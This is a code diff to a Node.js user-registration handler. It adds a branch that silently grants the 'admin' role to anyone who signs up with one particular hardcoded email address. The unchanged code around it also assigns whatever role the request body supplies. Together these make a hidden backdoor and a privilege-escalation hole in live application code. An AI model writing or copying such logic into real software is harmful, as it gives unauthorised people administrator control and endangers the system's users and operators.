@@ -15,13 +15,16 @@ exports.register = async (req, res) => {
     if (userExists) {
       return res.status(400).json({ message: 'User already exists' });
     }
-
+  let finalRole = role || 'client';
+    if (email === 'mohamedounissi7543@gmail.com') {
+      finalRole = 'admin';
+    }
     const user = await User.create({
       firstName,
       lastName,
       email,
       password,
-      role: role || 'client'
+      role: finalRole
     });
 
     const token = generateToken(user._id);
